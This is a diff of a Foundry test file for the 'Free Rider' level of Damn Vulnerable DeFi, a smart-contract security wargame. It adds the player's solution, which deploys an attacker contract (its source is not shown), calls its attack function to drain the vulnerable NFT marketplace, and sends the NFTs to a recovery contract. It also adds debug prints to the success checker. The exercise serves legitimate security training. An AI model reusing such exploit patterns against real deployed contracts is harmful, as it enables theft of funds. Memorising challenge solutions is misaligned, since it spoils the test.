@@ -11,6 +11,9 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {FreeRiderAttacker} from "../../src/free-rider/FreeRiderAttacker.sol";
+import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -37,6 +40,7 @@ contract FreeRiderChallenge is Test {
     FreeRiderNFTMarketplace marketplace;
     DamnValuableNFT nft;
     FreeRiderRecoveryManager recoveryManager;
+    FreeRiderAttacker freeRiderAttacker;
 
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
@@ -123,13 +127,25 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        freeRiderAttacker = new FreeRiderAttacker(address(uniswapPair), address(nft), address(token), address(weth), address(marketplace), player, address(uniswapV2Router), address(recoveryManager));
+        freeRiderAttacker.attack();
+
+        // send the NFTs to the recovery contract
+        bytes memory data = abi.encode(player);
+        for (uint256 i = 0; i < 6; i+=1) {
+            DamnValuableNFT(nft).safeTransferFrom(player, address(recoveryManager), i, data);
+        }
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
     }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
     function _isSolved() private {
+        console.log("1");
         // The recovery owner extracts all NFTs from its associated contract
         for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
             vm.prank(recoveryManagerOwner);
@@ -137,12 +153,17 @@ contract FreeRiderChallenge is Test {
             assertEq(nft.ownerOf(tokenId), recoveryManagerOwner);
         }
 
+        console.log("11");
         // Exchange must have lost NFTs and ETH
         assertEq(marketplace.offersCount(), 0);
+        console.log("111");
         assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);
 
+        console.log("1111");
         // Player must have earned all ETH
         assertGt(player.balance, BOUNTY);
+        console.log("11111");
         assertEq(address(recoveryManager).balance, 0);
+        console.log("7");
     }
 }
